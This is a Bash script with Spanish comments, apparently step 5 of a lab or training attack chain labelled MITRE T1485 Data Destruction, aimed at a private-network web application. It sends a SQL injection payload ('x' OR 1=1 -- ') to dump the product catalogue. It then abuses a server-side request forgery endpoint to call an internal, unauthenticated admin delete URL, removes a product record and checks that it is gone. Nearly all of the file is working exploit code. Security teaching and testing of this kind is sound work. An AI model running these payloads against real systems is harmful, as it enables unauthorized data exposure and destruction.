#!/usr/bin/env bash
#
# Paso 5 - Data Destruction vía SSRF + Admin (T1485)
# Eliminación de registros encadenando ambas vulnerabilidades
#
# Táctica: Impacto
# Técnica MITRE: T1485 - Data Destruction
#
# Uso: ./tests/pasos/05-impacto.sh [BASE_URL]
#   BASE_URL por defecto: http://192.168.56.112:8080

BASE_URL="${1:-http://192.168.56.112:8080}"
ENDPOINT_SSRF="$BASE_URL/api/v1/proveedor/status"
ENDPOINT_PROD="$BASE_URL/api/v1/productos"

echo "==================================================================="
echo " PASO 5: Data Destruction (T1485)"
echo " Eliminando registros via SSRF + Admin interno"
echo "==================================================================="

echo
echo "--- Productos antes del ataque ---"
curl -s -G "$ENDPOINT_PROD" --data-urlencode "categoria=x' OR 1=1 -- "
echo

echo
echo "--- Eliminando producto con id=2 (Monitor 67\") ---"
echo "URL: $ENDPOINT_SSRF?url=http://127.0.0.1:9090/admin/delete?id=2"
RESP=$(curl -s --max-time 3 "$ENDPOINT_SSRF?url=http://127.0.0.1:9090/admin/delete?id=2")
echo "$RESP"
if echo "$RESP" | grep -q "deleted"; then
  echo "[!] Producto eliminado sin autenticacion"
fi

echo
echo "--- Productos despues del ataque ---"
curl -s -G "$ENDPOINT_PROD" --data-urlencode "categoria=x' OR 1=1 -- "
echo
echo "[!] El Monitor 67\" (id=2) ya no aparece en el catalogo"
echo
